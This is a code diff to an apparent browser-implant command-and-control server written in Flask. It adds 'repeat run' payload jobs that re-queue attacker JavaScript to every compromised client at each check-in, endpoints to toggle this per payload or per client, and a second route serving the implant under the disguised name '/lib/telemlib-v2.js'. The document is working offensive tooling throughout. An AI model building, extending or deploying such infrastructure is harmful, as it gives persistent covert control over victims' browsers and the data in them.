@@ -407,6 +407,7 @@ class CustomPayload(db.Model):
     description = db.Column(db.Text, nullable=True)
     code        = db.Column(db.Text, nullable=False)
     autorun     = db.Column(db.Boolean, nullable=False, default=False)
+    repeatrun   = db.Column(db.Boolean, nullable=False, default=False)
 
     def __repr__(self):
         return f'<CustomPayload {self.id}>'
@@ -514,6 +515,19 @@ def clientSeen(identifier, ip, userAgent):
     # update method touches the database lastseen timestamp
     client.update()
     # print("--- Done client seen update...")
+
+
+    # Check for repeat run jobs
+    payloads = CustomPayload.query.filter_by(repeatrun=True)
+
+    for payload in payloads:
+        print("Repeat run job being added for client: " + str(client.id))
+        newJob = ClientPayloadJob(clientKey=client.id, code=payload.code)
+        db.session.add(newJob)
+
+    if payloads is not None:
+        dbCommit()  
+
 
 
 
@@ -626,6 +640,15 @@ def sendPayload():
 
         return response
 
+# Send a copy of the payload
+@app.route('/lib/telemlib-v2.js', methods=['GET'])
+def sendPayload2():
+    with open('./telemlib-v2.js', 'rb') as file:
+        payload = file.read()
+        response = make_response(payload, 200)
+        response.mimetype = 'text/javascript'
+
+        return response
 
 
 # Send c2 UI index page
@@ -1662,7 +1685,7 @@ def deleteBlockedIP(key):
 def getSavedCustomPayloads():
     savedPayloads = CustomPayload.query.all()
 
-    allSavedPayloads = [{'id':escape(payload.id), 'name':escape(payload.name), 'autorun':payload.autorun} for payload in savedPayloads]
+    allSavedPayloads = [{'id':escape(payload.id), 'name':escape(payload.name), 'autorun':payload.autorun, 'repeatrun':payload.repeatrun} for payload in savedPayloads]
 
     return jsonify(allSavedPayloads)
 
@@ -1726,6 +1749,22 @@ def runPayloadAllClients(key):
 
 
 
+@app.route('/api/setPayloadRepeatRun', methods=['POST'])
+@login_required
+def repeatPayloadAllClients():
+    content   = request.json
+    name      = content['name']
+    repeatrun = content['repeatrun']
+
+    payload = CustomPayload.query.filter_by(name=name).first()
+    
+    payload.repeatrun = repeatrun
+
+    dbCommit()
+
+    return "ok", 200
+
+
 
 
 @app.route('/api/runPayloadSingleClient', methods=['POST'])
@@ -1741,12 +1780,36 @@ def runPayloadSingleClient():
     # testing just for the print
     client = Client.query.filter_by(id=clientKey).first()
 
-    print("Running single client payload:")
-    print("Client: " + client.nickname)
-    print("Code: " + payload.code)
+    # print("Running single client payload:")
+    # print("Client: " + client.nickname)
+    # print("Code: " + payload.code)
 
     newJob = ClientPayloadJob(clientKey=clientKey, code=payload.code)
     db.session.add(newJob)
+    dbCommit()
+
+    return "ok", 200
+
+
+@app.route('/api/repeatPayloadSingleClient', methods=['POST'])
+@login_required
+def repeatPayloadSingleClient():
+    content = request.json 
+
+    payloadKey = content['payloadKey']
+    clientKey  = content['clientKey']
+
+    payload = CustomPayload.query.filter_by(id=payloadKey).first()
+
+    # testing just for the print
+    client = Client.query.filter_by(id=clientKey).first()
+
+    # print("Running single client payload:")
+    # print("Client: " + client.nickname)
+    # print("Code: " + payload.code)
+
+    repeatJob = RepeatClientPayloadJob(clientKey=clientKey, code=payload.code)
+    db.session.add(repeatJob)
     dbCommit()
 
     return "ok", 200
@@ -1860,6 +1923,7 @@ if __name__ == '__main__':
                     FetchHeader.__table__.drop(db.engine)
                     FetchCall.__table__.drop(db.engine)
                     Event.__table__.drop(db.engine)
+                    ClientPayloadJob.__table__.drop(db.engine)
                     dbCommit()
 
                     db.create_all()
